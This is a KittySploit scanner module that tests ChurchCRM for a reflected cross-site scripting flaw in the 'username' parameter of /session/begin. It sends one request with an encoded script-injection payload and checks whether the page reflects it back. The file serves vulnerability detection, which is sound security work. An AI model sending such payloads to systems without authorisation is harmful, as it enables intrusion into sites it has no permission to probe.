#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A reflected cross-site scripting (XSS) vulnerability was discovered in ChurchCRM via the 'username' parameter ."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'ChurchCRM - Cross-Site Scripting Detection',
        'description': "A reflected cross-site scripting (XSS) vulnerability was discovered in ChurchCRM via the 'username' parameter in /session/begin.",
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'vulnerability', 'churchcrm', 'xss', 'crm', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/ChurchCRM/CRM/blob/91cfa8eb00aef724705f5e038c236c146c6cf3a6/src/session/templates/begin-session.php#L39',
        ],
    }

    def run(self):
        r = self.http_request(method="GET", path='/session/begin?username=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = (r.text or "").lower()
        body_any = ('text/html',)
        body_all = ('<script>alert(document.domain)</script>', 'churchcrm',)
        if (any(m in body for m in body_any)) and (all(m in body for m in body_all)):
            self.set_info(
                severity='medium',
                reason="ChurchCRM - Cross-Site Scripting detected",
                path='/session/begin?username=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E',
            )
            return True
        return False

